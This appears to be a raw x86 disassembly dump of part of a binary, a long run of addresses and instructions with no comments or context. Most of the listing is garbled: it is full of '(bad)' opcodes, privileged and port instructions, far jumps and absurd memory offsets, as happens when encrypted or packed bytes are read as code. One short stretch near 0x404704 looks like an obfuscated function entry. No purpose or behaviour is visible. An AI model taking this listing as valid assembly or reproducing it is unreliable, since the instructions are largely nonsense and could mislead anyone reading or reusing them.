  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4235cf,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4235d7,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4235d7,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0xd13c87ea
  4047be:	sbb    edx,DWORD PTR [edi+0x7e7e7e7e]
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fxch   st(4)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [ebx]
  4047d5:	add    ecx,DWORD PTR [eax]
  4047d7:	(bad)  
  4047d9:	bswap  eax
  4047db:	adc    BYTE PTR [edi],dh
  4047dd:	sbb    BYTE PTR [edi],bl
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
